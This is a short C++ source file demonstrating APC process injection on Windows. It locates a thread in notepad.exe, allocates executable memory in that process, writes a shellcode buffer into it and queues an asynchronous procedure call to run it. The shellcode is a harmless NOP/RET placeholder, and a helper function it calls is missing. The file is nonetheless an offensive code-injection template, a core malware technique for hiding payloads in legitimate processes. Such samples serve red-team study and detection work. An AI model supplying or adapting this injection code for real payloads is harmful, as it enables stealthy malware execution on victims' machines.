// Filename: apc_injection.cpp
// Purpose: APC injection into a sleeping thread
// Author: Joas A Santos

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetThreadFromPid(DWORD pid) {
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while (Thread32Next(snapshot, &te)) {
        if (te.th32OwnerProcessID == pid) {
            CloseHandle(snapshot);
            return te.th32ThreadID;
        }
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    DWORD pid = GetPidByName(L"notepad.exe");
    DWORD tid = GetThreadFromPid(pid);
    BYTE shellcode[] = { 0x90, 0x90, 0xC3 };

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteMem, shellcode, sizeof(shellcode), NULL);
    QueueUserAPC((PAPCFUNC)remoteMem, hThread, NULL);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
